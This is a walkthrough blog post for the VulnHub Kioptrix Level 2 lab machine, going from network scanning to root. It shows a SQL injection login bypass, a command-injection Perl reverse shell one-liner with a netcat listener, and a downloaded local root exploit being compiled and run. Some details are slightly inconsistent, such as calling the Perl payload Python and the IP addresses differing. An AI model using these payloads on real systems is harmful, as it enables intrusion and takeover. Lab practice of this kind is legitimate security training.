---
layout: post
title: Kioptrix Level 2 (VulnHub) - Complete Walkthrough and Guide
subtitle: Here is a complete walkthrough and tutorial on how to beat Kioptrix Level 2 (Kioptrix - Level 1.1) of VulnHub to acquire root access.
excerpt: Here is a complete walkthrough and tutorial on how to beat Kioptrix Level 2 (Kioptrix - Level 1.1) of VulnHub to acquire root access.
comments: false
thumbnail-img: https://i.imgur.com/hInZ9y4.jpg
categories:
- WalkThroughs 
tags:
- vulnhub
---

Here is a complete walkthrough and tutorial on how to hack and penetrate Kioptrix Level 2 (Kioptrix: Level 1.1) of VulnHub.

![kioptrix_level_2](https://i.imgur.com/hInZ9y4.jpg){: .mx-auto.d-block :}

**Kioptrix Level 2 Description:**

Kioptrix Level 2 (or Kioptrix: Level 1.1) is a part of the Kioptrix vulnerable machine series. The objective is to acquire root access using techniques in vulnerability assessment and exploitation.

**Author:** Kioptrix

**Download:** [VulnHub](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)
### Kioptrix Level 2 Walkthrough
Kioptrix Level 2 was found by conducting an Nmap ping sweep and using the arp command.

~~~
nmap -sP 192.168.202.1-254

arp -a
~~~

![kioptrix_level_2_screenshot1](https://i.imgur.com/PrztbN3.jpg){: .mx-auto.d-block :}

Doing a quick Nmap scan, it was found that Kioptrix Level 2 port 80 was open - so it was accessed using a web browser.

~~~
nmap -n 192.168.202.129
~~~

![kioptrix_level_2_screenshot2](https://i.imgur.com/4azvB0Q.jpg){: .mx-auto.d-block :}

Browsing to **http:// 192.168.202.129** showed that Kioptrix Level 2 was hosting a **Remote System Administration Login** website with a username and password form.

~~~
http://192.168.216.129
~~~

![kioptrix_level_2_screenshot3](https://i.imgur.com/YMZBaTE.jpg){: .mx-auto.d-block :}

The **Remote System Administration Login** webpage was been tested for SQL injection attacks and it was found out that using **1' or '1' = '1** as the username and password will let you bypass the login credentials and access the **Basic Administrative Web Console** which lets you ping a machine on the network.

![kioptrix_level_2_screenshot4](https://i.imgur.com/MVacV2g.jpg){: .mx-auto.d-block :}

The ping form was then tested for SQL injection vulnerabilities which found that a simple **semi-colon (;)** will allow the attacker to inject commands.

A Netcat listener was opened which waits for incoming connections while a reverse shell Python command was then used on the Ping form to obtain a low privilege shell.

~~~
nc -nlvp 443

Command used on the Ping form:

;perl -e 'use Socket;$i="192.168.202.128";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
~~~

![kioptrix_level_2_screenshot5](https://i.imgur.com/AG2hU6c.jpg){: .mx-auto.d-block :}

![kioptrix_level_2_screenshot6](https://i.imgur.com/Ak1jktk.jpg){: .mx-auto.d-block :}

![kioptrix_level_2_screenshot7](https://i.imgur.com/YFyDnFU.jpg){: .mx-auto.d-block :}

The low privilege shell was used to enumerate Kioptrix Level 2 which found that it is vulnerable to **[2.4/2.6 sock_sendpage() local root](https://www.exploit-db.com/exploits/9545/)** exploit which can be found on Exploit Database.

The exploit was then downloaded on Kioptrix Level 2 and was executed which resulted on gaining a root shell.

~~~
wget https://www.exploit-db.com/download/9545 -O /tmp/linux-sendpage.c --no-check-certificate

gcc -Wall -o linux-sendpage linux-sendpage.c

chmod 777 linux-sendpage

./linux-sendpage
~~~

![kioptrix_level_2_screenshot8](https://i.imgur.com/RTfAaR1.jpg){: .mx-auto.d-block :}

![kioptrix_level_2_screenshot9](https://i.imgur.com/08YnJRJ.jpg){: .mx-auto.d-block :}

![kioptrix_level_2_screenshot10](https://i.imgur.com/VRMiKSl.jpg){: .mx-auto.d-block :}

Kioptrix Level 2 has been successfully hacked and exploited!

